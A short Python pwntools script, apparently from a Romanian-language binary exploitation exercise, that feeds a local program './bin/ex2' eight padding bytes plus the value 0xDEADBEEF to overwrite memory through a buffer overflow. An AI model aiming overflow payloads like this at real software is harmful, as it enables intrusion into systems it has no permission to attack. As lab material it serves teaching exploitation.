#!/usr/bin/env python3
from pwn import *

target = process("./bin/ex2")

payload = b"A" * 8 + p64(0xDEADBEEF)

target.sendline(payload)  # sendline adaugă newline, ca scanf să se termine
print("[+] Output program:")
print(target.recvall().decode())
